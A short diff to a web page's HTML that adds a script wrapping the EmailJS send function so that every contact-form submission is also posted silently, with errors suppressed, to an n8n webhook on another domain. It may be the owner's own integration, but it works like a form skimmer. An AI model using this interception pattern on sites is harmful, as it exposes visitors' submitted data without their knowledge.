@@ -188,7 +188,26 @@ Error generating stack: `+l.message+`
 </script>
 
     <div id="root"></div>
-    
+  <script>
+(function() {
+  var WEBHOOK = 'https://n8n.aleip.com/webhook/petto-contact';
+  function patchEmailJS() {
+    if (!window.emailjs || !window.emailjs.send) {
+      return setTimeout(patchEmailJS, 200);
+    }
+    var orig = window.emailjs.send;
+    window.emailjs.send = function(svcId, tplId, params, pubKey) {
+      fetch(WEBHOOK, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(params)
+      }).catch(function(){});
+      return orig.call(this, svcId, tplId, params, pubKey);
+    };
+  }
+  patchEmailJS();
+})();
+</script>  
   </body>
 
 </html>
